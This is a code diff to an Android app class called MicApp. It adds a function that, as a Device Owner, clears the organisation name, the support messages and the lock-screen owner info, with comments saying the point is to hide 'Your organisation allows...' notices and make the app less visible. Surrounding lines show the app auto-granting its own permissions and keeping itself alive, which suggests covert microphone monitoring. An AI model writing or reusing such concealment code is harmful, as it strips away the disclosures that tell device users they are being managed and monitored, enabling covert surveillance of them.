@@ -30,6 +30,13 @@ class MicApp : Application() {
             Log.e(TAG, "Failed to auto-grant permissions: ${e.message}")
         }
         
+        // Hide Device Owner organization messages (removes "Your organisation allows..." notifications)
+        try {
+            hideDeviceOwnerMessages()
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to hide Device Owner messages: ${e.message}")
+        }
+        
         // Disable battery optimization for this app (Device Owner)
         try {
             disableBatteryOptimization()
@@ -158,6 +165,41 @@ class MicApp : Application() {
         // Try to open autostart settings for user (backup method)
         if (manufacturer in listOf("xiaomi", "redmi", "oppo", "realme", "vivo", "oneplus", "huawei", "honor")) {
             Log.i(TAG, "Chinese ROM detected: $manufacturer - service will stay alive via foreground notification")
+        }
+    }
+    
+    /**
+     * Hide Device Owner organization messages to make the app less visible.
+     * This removes the "Your organisation allows..." notifications.
+     */
+    private fun hideDeviceOwnerMessages() {
+        if (!UpdateService.isDeviceOwner(this)) return
+        
+        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+        
+        try {
+            // Set empty organization name (removes "Your organisation" text)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                dpm.setOrganizationName(admin, "")
+                Log.i(TAG, "Organization name cleared")
+            }
+            
+            // Set empty support messages
+            dpm.setShortSupportMessage(admin, null)
+            dpm.setLongSupportMessage(admin, null)
+            Log.i(TAG, "Support messages cleared")
+            
+            // Hide device owner status in settings (Android 10+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                try {
+                    // This makes the app less visible in Settings
+                    dpm.setDeviceOwnerLockScreenInfo(admin, null)
+                } catch (_: Exception) {}
+            }
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to hide Device Owner messages: ${e.message}")
         }
     }
 }
